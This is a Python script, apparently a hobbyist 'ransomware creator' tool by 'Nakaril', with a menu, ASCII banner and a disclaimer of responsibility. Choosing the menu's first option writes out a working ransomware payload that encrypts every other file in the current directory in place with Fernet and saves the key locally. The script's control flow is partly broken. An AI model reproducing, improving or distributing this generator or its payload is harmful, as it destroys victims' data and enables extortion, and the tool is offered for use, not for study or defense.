import time 
import os

def clear_console():
    # Verifica el sistema operativo para utilizar el comando correcto
    if os.name == 'posix':  # Para sistemas Unix (como Kali Linux)
        os.system('clear')
    elif os.name == 'nt':  # Para sistemas Windows
        os.system('cls')

# Limpia la consola antes de ejecutar tu código
clear_console()

def print_red(text):
    print("\033[31m" + text + "\033[0m")

print_red("            ____                    ____                _		")
print_red("           |  _ \ __ _ _ __  ___   / ___|_ __ ___  __ _| |_ ___  _ __	")
print_red("           | |_) / _` | '_ \/ __| | |   | '__/ _ \/ _` | __/ _ \| '__|	")
print_red("           |  _ < (_| | | | \__ \ | |___| | |  __/ (_| | || (_) | |	")
print_red("           |_| \_\__,_|_| |_|___/  \____|_|  \___|\__,_|\__\___/|_|	")


def ipap(texto):
    for caracter in texto:
        print(caracter, end='', flush=True)  # Imprime el carácter sin salto de línea
        time.sleep(0.1)  # Pausa de 0.1 segundos

# Ejemplo de uso
texto = "\033[31m          by Nakaril \033[0m"
gb = "Goodbye 🖕"
about = "hi i am the developer of the code, you might ask yourself who are this guy? and his answer is that it dosen't matter, i am not responsable of what you are gonna do with my tool, btw share this with your friends"

ipap(texto)

time.sleep(1)

print("\n")
time.sleep(1)
print("\n")
time.sleep(1)
print("\n")
time.sleep(0.5)





mtxt = "	Menu: "
ipap(mtxt)

print("\n \n [1] Ransomware creator \n [2] About the code \n [00] Exit \n")

def mendu():
  menu = int(input(" RC: "))
  if menu == 00:
     ipap(gb)
     exit()
  elif menu == 2:
     ipap(about)
     mendu()
  elif menu == 1:
         code = '''\
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "main.py" or file == "thekey.key" or file == "decrypt.py" or file == nombre "{}":
        continue
    if os.path.isfile(file):
        files.append(file)
        
print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
print("Your files has been encripted!!")
'''
  folder_path = "ransomwares"

# Comprueba si la carpeta existe, y si no, la crea
  if not os.path.exists(folder_path):
    os.makedirs(folder_path)
  
  word = input("Choose the ransomware name: ")

  with open("ransomwares/" + word + ".py", "w") as f:
      f.write(code.replace('nombre "{}"', '"{}.py"'.format(word)))
mendu()


